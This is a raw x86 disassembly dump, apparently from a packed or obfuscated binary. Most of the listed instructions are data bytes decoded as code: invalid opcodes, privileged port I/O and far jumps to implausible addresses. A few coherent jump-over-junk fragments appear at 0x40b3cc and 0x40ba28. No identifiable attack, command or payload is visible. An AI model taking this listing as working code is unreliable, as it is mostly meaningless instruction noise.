  40b3a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3a4:	imul   ebp,DWORD PTR [esi-0x1a],0xffffff9e
  40b3a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3a9:	lds    ebx,FWORD PTR [esp+ebp*2]
  40b3ac:	pop    ss
  40b3ad:	ret    
  40b3ae:	test   al,0x78
  40b3b0:	enter  0xa38d,0x22
  40b3b4:	pop    edi
  40b3b5:	jnp    0x40b353
  40b3b7:	stc    
  40b3b8:	in     al,dx
  40b3b9:	push   ebx
  40b3ba:	stc    
  40b3bb:	pop    es
  40b3bc:	aad    0x1b
  40b3be:	push   0xd14e713b
  40b3c3:	fsubr  QWORD PTR [ebx]
  40b3c5:	repz rcl DWORD PTR [ecx+0x8458b36],1
  40b3cc:	mov    ecx,DWORD PTR [ebp-0x8]
  40b3cf:	xor    eax,esi
  40b3d1:	add    eax,edi
  40b3d3:	jmp    0x40b6f4
  40b3d8:	and    eax,0x5044d49b
  40b3dd:	jno    0x40b394
  40b3df:	pop    ebx
  40b3e0:	xchg   ebp,eax
  40b3e1:	sar    eax,cl
  40b3e3:	cmp    eax,0x443bb6ce
  40b3e8:	or     ch,bh
  40b3ea:	jle    0x40b46a
  40b3ec:	jp     0x40b46b
  40b3ee:	jle    0x40b46e
  40b3f0:	sub    bh,dl
  40b3f2:	push   ebx
  40b3f3:	add    BYTE PTR [ecx],al
  40b3f5:	push   edi
  40b3f6:	icebp  
  40b3f7:	fs mov bh,0x29
  40b3fa:	test   eax,0x8395beaf
  40b3ff:	xchg   edx,eax
  40b400:	iret   
  40b401:	xor    dl,dh
  40b403:	mov    ch,0x6d
  40b405:	scas   eax,DWORD PTR es:[edi]
  40b406:	aad    0x0
  40b408:	xchg   ecx,eax
  40b409:	fcom   st(1)
  40b40b:	dec    esp
  40b40c:	inc    edx
  40b40d:	pushf  
  40b40e:	add    ebx,DWORD PTR ds:0x4f4334a9
  40b414:	iret   
  40b415:	test   al,0x34
  40b417:	mov    ebp,0x7ab7280f
  40b41c:	xor    edx,DWORD PTR [esi-0x6403c711]
  40b422:	add    eax,0xdccb82ed
  40b427:	push   ss
  40b428:	test   al,0x23
  40b42a:	mov    al,0xf0
  40b42c:	cmp    al,0x62
  40b42e:	loopne 0x40b3b5
  40b430:	(bad)  
  40b431:	dec    esp
  40b432:	inc    ebx
  40b433:	addr16 jo 0x40b43c
  40b436:	jb     0x40b3f4
  40b438:	out    dx,al
  40b439:	mov    ?,WORD PTR ds:0x5bb5d9b8
  40b43f:	mov    esp,0x2d856477
  40b444:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b445:	xlat   BYTE PTR ds:[ebx]
  40b446:	push   edi
  40b447:	jp     0x40b427
  40b449:	ins    DWORD PTR es:[edi],dx
  40b44a:	xor    al,0xd9
  40b44c:	sub    edi,DWORD PTR [ecx+0x78]
  40b44f:	cld    
  40b450:	adc    cl,BYTE PTR [edx+0x234a86c]
  40b456:	out    0x6f,al
  40b458:	push   ss
  40b459:	xlat   BYTE PTR ds:[ebx]
  40b45a:	adc    al,BYTE PTR [ecx]
  40b45c:	in     eax,dx
  40b45d:	rcl    BYTE PTR [edi+edi*8-0x3a9ee15a],0x33
  40b465:	cmp    ecx,esp
  40b467:	out    dx,eax
  40b468:	add    ecx,esi
  40b46a:	scas   eax,DWORD PTR es:[edi]
  40b46b:	mov    dl,0xaf
  40b46d:	or     ch,BYTE PTR [edi+0x31fac2b8]
  40b473:	inc    ecx
  40b474:	dec    esi
  40b475:	push   0xdb21e57b
  40b47a:	leave  
  40b47b:	mov    ds:0xb9ec66fb,al
  40b480:	in     eax,0x3a
  40b482:	cdq    
  40b483:	adc    eax,esi
  40b485:	and    eax,0x44c6f4a2
  40b48a:	xchg   ebp,eax
  40b48b:	repz push ss
  40b48d:	mov    eax,ds:0x4a3b4d82
  40b492:	bound  ecx,QWORD PTR [edi]
  40b494:	or     DWORD PTR [edi-0x3a],esi
  40b497:	sub    eax,0x6b90c8ba
  40b49c:	jmp    0x4fd6:0xc7fb75a1
  40b4a3:	cmp    eax,0xbafbf0a7
  40b4a8:	aas    
  40b4a9:	inc    ebp
  40b4aa:	shr    DWORD PTR [ebp-0x43],0xb8
  40b4ae:	mov    ?,WORD PTR [edi+edi*2]
  40b4b1:	pop    ds
  40b4b2:	or     ecx,edx
  40b4b4:	icebp  
  40b4b5:	lock jecxz 0x40b497
  40b4b8:	pop    ebx
  40b4b9:	cli    
  40b4ba:	xor    DWORD PTR [edx+0x2a],0x1
  40b4be:	or     eax,0x13e69680
  40b4c3:	das    
  40b4c4:	mov    ds:0xdbcbce70,eax
  40b4c9:	mov    ebx,0xf4daa2d4
  40b4ce:	stos   DWORD PTR es:[edi],eax
  40b4cf:	push   WORD PTR [ecx-0x3ade0ac1]
  40b4d6:	dec    esi
  40b4d7:	addr16 add al,0x17
  40b4da:	lea    edi,[ebp-0xd602a18]
  40b4e0:	pushf  
  40b4e1:	dec    dx
  40b4e3:	xor    ecx,DWORD PTR ss:[edx+0x272703d8]
  40b4ea:	xor    al,0x16
  40b4ec:	fld    QWORD PTR [edi-0x6c]
  40b4ef:	jns    0x40b54b
  40b4f1:	push   edx
  40b4f2:	outs   dx,BYTE PTR ds:[esi]
  40b4f3:	push   ebp
  40b4f4:	add    BYTE PTR ds:0xf6cfab30,cl
  40b4fa:	out    0x5f,al
  40b4fc:	and    BYTE PTR [bp+si-0x278e],ch
  40b501:	stos   DWORD PTR es:[edi],eax
  40b502:	pop    ecx
  40b503:	cld    
  40b504:	scas   eax,DWORD PTR es:[edi]
  40b505:	push   ss
  40b506:	xchg   ebx,eax
  40b507:	add    DWORD PTR [ebx+0x3645f495],edi
  40b50d:	ins    BYTE PTR es:[edi],dx
  40b50e:	outs   dx,BYTE PTR ds:[esi]
  40b50f:	fild   DWORD PTR [eax-0x4e78bd79]
  40b515:	xchg   ebp,eax
  40b516:	outs   dx,DWORD PTR ds:[esi]
  40b517:	shl    BYTE PTR ds:0x68b4ac7d,cl
  40b51d:	les    esi,FWORD PTR [ebx+eiz*4]
  40b520:	shl    eax,cl
  40b522:	pop    ecx
  40b523:	xchg   ebx,eax
  40b524:	sub    eax,0x723ad4c3
  40b529:	fstp   TBYTE PTR [edx+0x4dba0ea9]
  40b52f:	xchg   DWORD PTR [ebx],esi
  40b531:	dec    eax
  40b532:	lds    ebp,FWORD PTR [ebp+0x48959f1d]
  40b538:	jg     0x40b5a5
  40b53a:	fwait
  40b53b:	js     0x40b5a1
  40b53d:	push   0xffffff9a
  40b53f:	aas    
  40b540:	rol    DWORD PTR [eax-0x7d],1
  40b543:	repnz sub DWORD PTR [eax+0x49a8f9cf],esi
  40b54a:	or     BYTE PTR [edi+0x1e2543d7],bl
  40b550:	xor    BYTE PTR [edx],0xb6
  40b553:	outs   dx,DWORD PTR ds:[esi]
  40b554:	push   cs
  40b555:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b556:	shr    BYTE PTR [ecx-0x147cf126],1
  40b55c:	ja     0x40b553
  40b55e:	sub    ch,0xef
  40b561:	sbb    al,0x70
  40b563:	add    eax,0x82459a60
  40b568:	inc    ecx
  40b569:	inc    edx
  40b56a:	jl     0x40b53c
  40b56c:	push   edi
  40b56d:	loopne 0x40b5b6
  40b56f:	in     eax,dx
  40b570:	lods   eax,DWORD PTR ds:[esi]
  40b571:	int3   
  40b572:	or     BYTE PTR [ebx+esi*4+0x6d],bh
  40b576:	out    0xdc,al
  40b578:	xor    eax,0x7308a693
  40b57d:	xor    eax,0xc1934aab
  40b582:	idiv   BYTE PTR [ebx]
  40b584:	sbb    BYTE PTR [ebp+0x20],0x26
  40b588:	or     BYTE PTR [ebp-0x21],ah
  40b58b:	lea    ebp,[ecx]
  40b58d:	adc    BYTE PTR [eax+0x856603a],bl
  40b593:	(bad)  
  40b594:	aad    0xa4
  40b596:	or     eax,0x24
  40b599:	pop    ss
  40b59a:	jmp    0xd064:0x6370da78
  40b5a1:	popa   
  40b5a2:	and    eax,edx
  40b5a4:	lea    edx,[ebx+edi*8]
  40b5a7:	mov    ch,0x60
  40b5a9:	xchg   edx,eax
  40b5aa:	dec    ecx
  40b5ab:	leave  
  40b5ac:	mov    al,ds:0xf6ab386c
  40b5b1:	and    esi,DWORD PTR [edx+0x7f]
  40b5b4:	iret   
  40b5b5:	mov    ebx,DWORD PTR [ebx]
  40b5b7:	aas    
  40b5b8:	mov    dh,0x85
  40b5ba:	aaa    
  40b5bb:	xchg   esp,eax
  40b5bc:	or     ebp,DWORD PTR [edx]
  40b5be:	popf   
  40b5bf:	cmp    ecx,0xffffff92
  40b5c2:	cmp    al,0x7e
  40b5c4:	cmp    al,0x1c
  40b5c6:	daa    
  40b5c7:	test   edx,edx
  40b5c9:	jnp    0x40b5f9
  40b5cb:	or     ecx,DWORD PTR [edx+0x69]
  40b5ce:	adc    eax,0x8b2b96ef
  40b5d3:	inc    edx
  40b5d4:	popa   
  40b5d5:	repz call 0x5e1c:0x5766dfab
  40b5dd:	xchg   edi,eax
  40b5de:	lods   eax,DWORD PTR ds:[esi]
  40b5df:	mov    cl,0x1d
  40b5e1:	loop   0x40b606
  40b5e3:	jb     0x40b5c6
  40b5e5:	xchg   esi,eax
  40b5e6:	add    al,0x63
  40b5e8:	xor    BYTE PTR [eax],0x15
  40b5eb:	add    eax,0x9b798711
  40b5f0:	popf   
  40b5f1:	int3   
  40b5f2:	pusha  
  40b5f3:	popf   
  40b5f4:	inc    ebx
  40b5f5:	and    ebx,DWORD PTR [edi-0x2]
  40b5f8:	xor    eax,0xc3cc8954
  40b5fd:	sub    eax,0xcb599808
  40b602:	jnp    0x40b58b
  40b604:	jns    0x40b5d9
  40b606:	shl    BYTE PTR [ecx],1
  40b608:	pop    edi
  40b609:	loop   0x40b635
  40b60b:	xor    eax,edi
  40b60d:	jmp    0xfeff:0xf6bc35ee
  40b614:	(bad)  
  40b616:	adc    dl,cl
  40b618:	inc    edi
  40b619:	xor    DWORD PTR [edx-0x26],0x5ec25371
  40b620:	(bad)  
  40b621:	jg     0x40b5b3
  40b623:	push   esp
  40b624:	ror    BYTE PTR [eax],1
  40b626:	xchg   esi,eax
  40b627:	xor    edi,DWORD PTR [edx+0x44e19de8]
  40b62d:	les    eax,FWORD PTR [ebx+0x49]
  40b630:	mov    eax,0x6e4d0c67
  40b635:	cdq    
  40b636:	in     eax,dx
  40b637:	rcl    DWORD PTR [ebp-0x70],0x90
  40b63b:	sub    eax,0x47f50b8
  40b640:	les    eax,FWORD PTR [edx]
  40b642:	cmc    
  40b643:	lahf   
  40b644:	and    esp,edi
  40b646:	push   0xe1e767af
  40b64b:	imul   edi,edi,0xa22c0195
  40b651:	cmp    eax,0xae586915
  40b656:	xchg   ecx,eax
  40b657:	popf   
  40b658:	(bad)  
  40b659:	pop    edi
  40b65a:	sub    eax,0xd8e2e34a
  40b65f:	xchg   edi,eax
  40b660:	fldenv [eax]
  40b662:	xchg   ebp,eax
  40b663:	pop    DWORD PTR [edi]
  40b665:	inc    edi
  40b666:	jb     0x40b6ca
  40b668:	arpl   WORD PTR [ecx],sp
  40b66a:	cmc    
  40b66b:	mov    esp,0x1288e598
  40b670:	jns    0x40b664
  40b672:	add    esp,DWORD PTR [esi+0x2ba964a4]
  40b678:	pushf  
  40b679:	popa   
  40b67a:	jmp    0x499838fb
  40b67f:	xor    al,0x67
  40b681:	mov    ds:0x57af784,al
  40b686:	(bad)  
  40b688:	call   0xe5eba36c
  40b68d:	sti    
  40b68e:	enter  0xca82,0x43
  40b692:	xchg   ebp,eax
  40b693:	pusha  
  40b694:	xchg   ecx,eax
  40b695:	in     al,0xc0
  40b697:	sub    cl,BYTE PTR [ebx]
  40b699:	in     eax,0xe
  40b69b:	cli    
  40b69c:	or     al,0x33
  40b69e:	aaa    
  40b69f:	cmp    edi,DWORD PTR ds:[esi]
  40b6a2:	popa   
  40b6a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6a4:	int    0xa2
  40b6a6:	icebp  
  40b6a7:	push   es
  40b6a8:	cld    
  40b6a9:	test   DWORD PTR [ecx-0x7df62b92],eax
  40b6af:	jno    0x40b72f
  40b6b1:	cmp    BYTE PTR [edi+ebx*8+0x7a3cc8e],bh
  40b6b8:	push   ds
  40b6b9:	pushf  
  40b6ba:	in     eax,0xb7
  40b6bc:	jl     0x40b6e2
  40b6be:	add    al,0x90
  40b6c0:	xor    esp,eax
  40b6c2:	out    0x77,al
  40b6c4:	sahf   
  40b6c5:	cwde   
  40b6c6:	retf   
  40b6c7:	pop    ds
  40b6c8:	sti    
  40b6c9:	repz repz out dx,eax
  40b6cc:	in     al,dx
  40b6cd:	(bad)  
  40b6ce:	stos   DWORD PTR es:[edi],eax
  40b6cf:	mov    dh,0x9c
  40b6d1:	cmc    
  40b6d2:	jg     0x40b6e4
  40b6d4:	jne    0x40b6d2
  40b6d6:	pop    ebx
  40b6d7:	icebp  
  40b6d8:	dec    edx
  40b6d9:	mov    dh,0x96
  40b6db:	aad    0x63
  40b6dd:	sub    al,0xe8
  40b6df:	jns    0x40b66f
  40b6e1:	(bad)  
  40b6e2:	aam    0x29
  40b6e4:	out    0xcb,al
  40b6e6:	fwait
  40b6e7:	ins    DWORD PTR es:[edi],dx
  40b6e8:	fcom   DWORD PTR [edx]
  40b6ea:	and    cl,BYTE PTR [edi+0x16]
  40b6ed:	arpl   WORD PTR [esi],dx
  40b6ef:	sahf   
  40b6f0:	xchg   ebp,eax
  40b6f1:	leave  
  40b6f2:	push   edi
  40b6f3:	mov    DWORD PTR [bx+di],eax
  40b6f6:	jmp    0x40c082
  40b6fb:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40b702:	jmp    0x40c082
  40b707:	jmp    0x40ba28
  40b70c:	and    esp,esi
  40b70e:	jnp    0x40b710
  40b710:	cmp    esp,ecx
  40b712:	and    ebp,esp
  40b714:	jp     0x40b6f1
  40b716:	push   edx
  40b717:	mov    ebx,es
  40b719:	add    eax,0xf814a725
  40b71e:	jle    0x40b79e
  40b720:	jp     0x40b79f
  40b722:	jle    0x40b7a2
  40b724:	jae    0x40b6bb
  40b726:	retf   0x6afe
  40b729:	aas    
  40b72a:	dec    edi
  40b72b:	repz pop es
  40b72d:	and    ah,BYTE PTR [ebx]
  40b72f:	rol    esp,0x89
  40b732:	mov    cs,ebp
  40b734:	mov    edi,0x2a52aab5
  40b739:	iret   
  40b73a:	push   esp
  40b73b:	pushf  
  40b73c:	xor    DWORD PTR [ebx-0x3f9f1ea8],0xf
  40b743:	or     eax,0x65a18ccc
  40b748:	fnstsw WORD PTR ds:0x9c042948
  40b74e:	add    al,dl
  40b750:	mov    bl,0xf0
  40b752:	mov    esi,0xbb42909d
  40b757:	(bad)  
  40b758:	icebp  
  40b759:	add    al,0xf
  40b75b:	repz fbld TBYTE PTR [edx-0x1]
  40b75f:	sub    al,0xb5
  40b761:	nop
  40b762:	into   
  40b763:	pop    eax
  40b764:	outs   dx,DWORD PTR ds:[esi]
  40b765:	lea    ecx,[esi-0x58]
  40b768:	sub    BYTE PTR [ebp-0x310efd37],0xfc
  40b76f:	les    eax,FWORD PTR [esi+0x7a]
  40b772:	rcr    BYTE PTR [ebp+0x543d0542],1
  40b778:	sub    al,0xf5
  40b77a:	dec    ebx
  40b77b:	out    dx,al
  40b77c:	mov    esp,0x25bf8d7a
  40b781:	fs cli 
  40b783:	xor    DWORD PTR [esi-0x393bfc1b],esp
  40b789:	adc    BYTE PTR [ecx+0x64],0x8a
  40b78d:	mov    DWORD PTR [edx-0x7a],edx
  40b790:	or     DWORD PTR [edx-0x68],esp
  40b793:	inc    esp
  40b794:	arpl   bp,si
  40b796:	ficomp WORD PTR [edi]
  40b798:	cld    
  40b799:	dec    ebp
  40b79a:	mov    ds:0x1c0f7cc6,eax
  40b79f:	sar    edx,0x44
  40b7a2:	mov    ecx,0xcd3593c
  40b7a7:	mov    dh,0x98
  40b7a9:	loope  0x40b797
  40b7ab:	jb     0x40b76e
  40b7ad:	int3   
  40b7ae:	ror    DWORD PTR gs:[eax],cl
  40b7b1:	loop   0x40b82f
  40b7b3:	cwde   
  40b7b4:	mov    WORD PTR [esi+0x21c486e8],fs
  40b7ba:	adc    ebx,DWORD PTR [edx]
  40b7bc:	imul   eax,edx,0x4f99e3d3
  40b7c2:	xchg   edi,eax
  40b7c3:	ficomp WORD PTR [esi]
  40b7c5:	inc    ebp
  40b7c6:	fwait
  40b7c7:	aad    0x20
  40b7c9:	mov    DWORD PTR [ebx+0x18],0x6e71ddf9
  40b7d0:	cmp    esp,esi
  40b7d2:	jg     0x40b768
  40b7d4:	xchg   esp,eax
  40b7d5:	jb     0x40b80a
  40b7d7:	pop    ebx
  40b7d8:	aaa    
  40b7d9:	nop
  40b7da:	or     al,0xbf
  40b7dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7dd:	sbb    DWORD PTR [esi+0x4c],0x923a893e
  40b7e4:	gs jb  0x40b85c
  40b7e7:	shl    DWORD PTR [ebx+0x6c],1
  40b7ea:	sub    ecx,ebx
  40b7ec:	add    al,0xc1
  40b7ee:	sub    ecx,DWORD PTR [eax]
  40b7f0:	push   ebx
  40b7f1:	sti    
  40b7f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7f3:	outs   dx,DWORD PTR ds:[esi]
  40b7f4:	xchg   esp,eax
  40b7f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7f6:	iret   
  40b7f7:	imul   BYTE PTR [edx]
  40b7f9:	test   BYTE PTR [ebx],dh
  40b7fb:	jae    0x40b85f
  40b7fd:	imul   edx,DWORD PTR [esp+edx*8],0x8c18dbab
  40b804:	fdivr  QWORD PTR [eax+0x4ba7a310]
  40b80a:	pusha  
  40b80b:	xchg   BYTE PTR [ecx-0x1986845f],al
  40b811:	push   0x7f
  40b813:	(bad)  
  40b814:	into   
  40b815:	icebp  
  40b816:	mov    bh,0x23
  40b818:	adc    DWORD PTR [eax],0xcd75c285
  40b81e:	mov    edx,0xe34f652d
  40b823:	outs   dx,BYTE PTR ds:[esi]
  40b824:	mov    ch,0x8f
  40b826:	fwait
  40b827:	(bad)  
  40b828:	xor    eax,0x34f4735a
  40b82d:	shl    BYTE PTR [edx+0x6],0xa9
  40b831:	pop    edx
  40b832:	and    eax,esp
  40b834:	cld    
  40b835:	jbe    0x40b848
  40b837:	mov    esi,0x10b00185
  40b83c:	int    0xdb
  40b83e:	add    eax,0x2e4c7e
  40b843:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b844:	xlat   BYTE PTR ds:[ebx]
  40b845:	in     eax,dx
  40b846:	fld    TBYTE PTR [edi-0x6fa9e9cf]
  40b84c:	xor    dh,BYTE PTR [ebx]
  40b84e:	hlt    
  40b84f:	leave  
  40b850:	pop    ebp
  40b851:	stac   
  40b854:	dec    ebp
  40b855:	js     0x40b898
  40b857:	ja     0x40b86c
  40b859:	pop    ds
  40b85a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b85b:	sbb    al,BYTE PTR [ecx-0x4165ed16]
  40b861:	ja     0x40b7e4
  40b863:	inc    ebp
  40b864:	dec    ecx
  40b865:	fwait
  40b866:	push   cs
  40b867:	in     eax,dx
  40b868:	jnp    0x40b84d
  40b86a:	pop    edx
  40b86b:	es iret 
  40b86d:	add    al,0x85
  40b86f:	gs (bad) 
  40b872:	mov    al,ds:0xf2f3a19c
  40b877:	inc    edx
  40b878:	push   0xfffffff6
  40b87a:	sbb    BYTE PTR [ecx],cl
  40b87c:	imul   edi,DWORD PTR [eax+0x1727ba71],0x3d
  40b883:	psllw  mm4,QWORD PTR [ebx]
  40b886:	pusha  
  40b887:	pushf  
  40b888:	(bad)  
  40b88c:	adc    eax,0x6e0a30d0
  40b891:	in     eax,0x13
  40b893:	mov    eax,ds:0x2ebd7eed
  40b898:	mov    ds:0xf401fdc4,eax
  40b89d:	in     al,dx
  40b89e:	sub    DWORD PTR [esi-0x63cc902],0x239699ef
  40b8a8:	xchg   ebx,eax
  40b8a9:	add    eax,0xa1c5609d
  40b8ae:	jnp    0x40b8f0
  40b8b0:	inc    esp
  40b8b1:	cmp    bh,BYTE PTR [edi]
  40b8b3:	cmc    
  40b8b4:	call   0x9c3e0988
  40b8b9:	icebp  
  40b8ba:	mov    ds:0xb1e781f5,eax
  40b8bf:	test   eax,0x7f2440df
  40b8c4:	or     al,0xe9
  40b8c6:	add    dh,BYTE PTR [edi-0x7c7d409d]
  40b8cc:	mov    ebp,0x55d59a4
  40b8d1:	or     eax,0xda69cc70
  40b8d6:	mov    eax,0x68569690
  40b8db:	ins    BYTE PTR es:[edi],dx
  40b8dc:	and    esp,eax
  40b8de:	sbb    esp,DWORD PTR [edi+ebx*1+0x64]
  40b8e2:	cli    
  40b8e3:	ins    BYTE PTR es:[edi],dx
  40b8e4:	cmp    esp,edx
  40b8e6:	loope  0x40b8d7
  40b8e8:	xchg   al,ah
  40b8ea:	leave  
  40b8eb:	xor    BYTE PTR [eax+0x47f6b0a8],dh
  40b8f1:	adc    BYTE PTR [esi+0x5b3f6a23],al
  40b8f7:	mov    al,0x86
  40b8f9:	adc    al,0x16
  40b8fb:	xchg   esp,eax
  40b8fc:	mov    esp,0x25e8da88
  40b901:	mov    WORD PTR ds:0x443613b6,gs
  40b907:	in     al,dx
  40b908:	xor    cl,ch
  40b90a:	data16 sub BYTE PTR [ecx],ch
  40b90d:	rol    DWORD PTR [esp+ebx*8-0x1275cbb5],0xfe
  40b915:	mov    eax,0xf2377664
  40b91a:	fisubr DWORD PTR [esi-0x7c02aeca]
  40b920:	sbb    ebx,eax
  40b922:	loope  0x40b970
  40b924:	(bad)  
  40b925:	pusha  
  40b926:	and    ebx,DWORD PTR [edi+0x5ac6cdab]
  40b92c:	xchg   ebx,eax
  40b92d:	int    0x6d
  40b92f:	xchg   ebp,eax
  40b930:	icebp  
  40b931:	push   ebp
  40b932:	dec    esp
  40b933:	or     al,0xf1
  40b935:	dec    ecx
  40b936:	rcr    DWORD PTR [esp+ecx*1+0x2bf057ad],0x44
  40b93e:	(bad)  
  40b93f:	jns    0x40b975
  40b941:	inc    eax
  40b942:	and    cl,al
  40b944:	xchg   BYTE PTR [ebp-0x10c90a0a],dh
  40b94a:	ss jp  0x40b972
  40b94d:	pop    edx
  40b94e:	outs   dx,BYTE PTR ds:[esi]
  40b94f:	cdq    
  40b950:	fwait
  40b951:	xor    eax,0x5f8f633f
  40b956:	repnz ror BYTE PTR [ebx+0xc645027],1
  40b95d:	mov    cl,0x97
  40b95f:	jbe    0x40b989
  40b961:	inc    ecx
  40b962:	ficom  WORD PTR [ecx]
  40b964:	pushf  
  40b965:	lahf   
  40b966:	test   DWORD PTR [esi+0xe35cfe1],0xe3df63b6
  40b970:	sbb    esp,DWORD PTR [edi+0x1f51ae33]
  40b976:	std    
  40b977:	rcr    DWORD PTR gs:[edi-0x6999189],1
  40b97e:	hlt    
  40b97f:	pop    ds
  40b980:	push   ss
  40b981:	aas    
  40b982:	cmp    BYTE PTR [ecx-0x247f88d6],bl
  40b988:	pop    ebx
  40b989:	cs (bad) 
  40b98b:	mov    ds:0x703ac18b,eax
  40b990:	xchg   edx,eax
  40b991:	sub    eax,edx
  40b993:	pop    edx
  40b994:	pop    esi
  40b995:	pop    edx
  40b996:	(bad)  
  40b997:	or     ch,al
  40b999:	jg     0x40b96f
  40b99b:	rcl    al,0xd0
  40b99e:	mov    ebx,0x12d4ca94
  40b9a3:	popf   
  40b9a4:	stos   BYTE PTR es:[edi],al
  40b9a5:	lods   eax,DWORD PTR ds:[esi]
  40b9a6:	addr16 test ecx,0x62214f45
  40b9ad:	xor    DWORD PTR [ecx],esp
  40b9af:	mov    DWORD PTR [ebx+ebp*1-0x29],esp
  40b9b3:	shr    DWORD PTR [ebp+0x6d01e8a3],0xbc
  40b9ba:	pop    ebp
  40b9bb:	or     BYTE PTR [edx],0xec
  40b9be:	xor    al,bh
  40b9c0:	fs into 
  40b9c2:	call   0xb6bb:0x5d27e67a
  40b9c9:	fs not ecx
  40b9cc:	retf   0xc287
  40b9cf:	pusha  
  40b9d0:	push   ebx
  40b9d1:	stc    
  40b9d2:	idiv   DWORD PTR [eax-0x16]
  40b9d5:	out    dx,al
  40b9d6:	push   es
  40b9d7:	push   esi
  40b9d8:	jnp    0x40b98d
  40b9da:	(bad)  
  40b9db:	in     al,0xd0
  40b9dd:	inc    edi
  40b9de:	jle    0x40ba33
  40b9e0:	outs   dx,DWORD PTR ds:[esi]
  40b9e1:	nop
  40b9e2:	adc    al,0xd
  40b9e4:	out    0xc1,al
  40b9e6:	xchg   DWORD PTR [esi-0x457d9a44],ebp
  40b9ec:	inc    esp
  40b9ed:	pop    ebp
  40b9ee:	xor    BYTE PTR [ebp+0x30ddb7c2],dh
  40b9f4:	mov    bl,BYTE PTR [edx-0x79011464]
  40b9fa:	cs add dh,cl
  40b9fd:	jns    0x40b9d0
  40b9ff:	sbb    al,bl
  40ba01:	imul   edi,DWORD PTR [edi],0xf6adb8ba
  40ba07:	lods   eax,DWORD PTR ds:[esi]
  40ba08:	icebp  
  40ba09:	push   ss
  40ba0a:	xor    ebx,DWORD PTR [edx+0x1acf672c]
  40ba10:	ret    
  40ba11:	cmp    DWORD PTR [ebp-0x1d8a82c1],eax
  40ba17:	repnz push eax
  40ba19:	sub    ah,BYTE PTR [eax+0x7e]
  40ba1c:	fmul   DWORD PTR [ecx]
  40ba1e:	xor    eax,eax
  40ba20:	or     al,0x36
  40ba22:	pop    edi
  40ba23:	sub    bl,al
  40ba25:	push   edi
  40ba26:	sti    
  40ba27:	daa    
  40ba28:	mov    eax,DWORD PTR [ebp-0x8]
  40ba2b:	mov    ecx,DWORD PTR [ebp-0x18]
  40ba2e:	jmp    0x40bd4f
  40ba33:	xchg   esp,eax
  40ba34:	jge    0x40ba82
  40ba36:	hlt    
  40ba37:	push   ebp
  40ba38:	jne    0x40b9ee
  40ba3a:	pop    ebp
  40ba3b:	cld    
  40ba3c:	into   
  40ba3d:	inc    edx
  40ba3e:	cmp    cl,cl
  40ba40:	adc    edi,DWORD PTR [ebp+0x4a]
  40ba43:	adc    BYTE PTR [edi+0x7d7a7e7e],al
  40ba49:	jle    0x40bac9
  40ba4b:	loope  0x40ba81
  40ba4d:	sbb    eax,0x4a5da81c
  40ba52:	or     eax,0x406fe3de
  40ba57:	test   eax,0x73d4994a
  40ba5c:	jne    0x40b9e7
  40ba5e:	int3   
  40ba5f:	imul   ebp,ecx,0xffffffbc
  40ba62:	out    dx,al
  40ba63:	sub    DWORD PTR [ebp+0x1d],0x22
  40ba67:	xchg   ebp,eax
  40ba68:	js     0x40bade
  40ba6a:	push   edi
  40ba6b:	cmp    al,0xa4
  40ba6d:	in     eax,0x68
  40ba6f:	lods   al,BYTE PTR ds:[esi]
  40ba70:	cli    
  40ba71:	pop    ebx
  40ba72:	push   edx
  40ba73:	dec    esi
  40ba74:	pop    edi
  40ba75:	push   edi
  40ba76:	gs add eax,0x9053c9a4
  40ba7c:	jno    0x40bad8
  40ba7e:	dec    edx
  40ba7f:	(bad)  
  40ba80:	aad    0x8b
  40ba82:	mov    ebx,0xb346e9d9
  40ba87:	xor    edx,DWORD PTR [eax-0x50208c3f]
  40ba8d:	mov    edi,0xcf25a913
  40ba92:	rcr    BYTE PTR [eax],cl
  40ba94:	out    dx,eax
  40ba95:	sbb    DWORD PTR [ebp+eiz*1+0x48cfe3c0],0xa39b1ae
  40baa0:	lea    ecx,[edx+edi*2+0x3d]
  40baa4:	outs   dx,DWORD PTR ds:[esi]
  40baa5:	loope  0x40ba31
  40baa7:	or     al,0x76
  40baa9:	es push eax
  40baab:	add    edx,DWORD PTR ds:0xa0507a1b
  40bab1:	fmul   st(6),st
  40bab3:	lods   al,BYTE PTR ds:[esi]
  40bab4:	loope  0x40ba38
  40bab6:	leave  
  40bab7:	xchg   esi,eax
  40bab8:	adc    al,BYTE PTR [eax+0x78]
  40babb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40babc:	dec    edx
  40babd:	sub    edi,0x19
  40bac0:	xchg   edx,eax
  40bac1:	adc    al,0x22
  40bac3:	or     cl,BYTE PTR [ebx+0x65c8febe]
  40bac9:	xlat   BYTE PTR ds:[ebx]
  40baca:	nop
  40bacb:	lods   eax,DWORD PTR ds:[esi]
  40bacc:	xor    ebp,edx
  40bace:	nop
  40bacf:	repnz aas 
  40bad1:	and    esi,DWORD PTR [ebx+0x20]
  40bad4:	or     dl,BYTE PTR [ebp-0x40]
  40bad7:	out    dx,eax
  40bad8:	xchg   esi,eax
  40bad9:	push   edx
  40bada:	aad    0xe8
  40badc:	add    bl,dh
  40bade:	xchg   ebx,eax
  40badf:	popa   
  40bae0:	(bad)  
  40bae1:	sbb    DWORD PTR [esi],ebp
  40bae3:	push   edx
  40bae4:	sub    eax,0xc3e31466
  40bae9:	daa    
  40baea:	adc    BYTE PTR [ebx-0x3b],cl
  40baed:	push   edi
  40baee:	pop    esi
  40baef:	daa    
  40baf0:	or     BYTE PTR [eax+0x131adce8],bh
  40baf6:	aad    0xfb
  40baf8:	xchg   esp,eax
  40baf9:	inc    DWORD PTR [ebp-0x45a8d3f4]
  40baff:	mov    edx,ecx
  40bb01:	pop    esi
  40bb02:	mov    al,0xd1
  40bb04:	popf   
  40bb05:	cmp    BYTE PTR [ecx+edi*8+0x7e],dl
  40bb09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb0a:	mov    ebx,0xfe7c08d
  40bb0f:	xchg   BYTE PTR [edx],ch
  40bb11:	push   es
